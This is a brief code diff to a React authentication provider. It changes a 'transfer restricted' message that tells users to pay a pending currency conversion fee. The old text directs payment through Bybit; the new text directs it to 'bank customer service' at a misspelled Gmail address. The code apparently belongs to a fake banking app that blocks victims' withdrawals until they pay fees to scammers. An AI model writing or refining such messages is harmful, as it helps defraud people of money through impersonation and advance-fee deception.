@@ -869,7 +869,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
     if (user.transferRestricted && user.pendingConversionFee) {
       return {
         restricted: true,
-        reason: 'Currency conversion fee pending. Please pay the required fee via Bybit to enable transfers.',
+        reason: 'Currency conversion fee pending. Please pay the required fee through bank customer service to enable transfers. Customer service email: managementofficails001@gmail.com',
         fee: user.pendingConversionFee,
         currency: user.pendingConversionCurrency || 'PLN'
       };
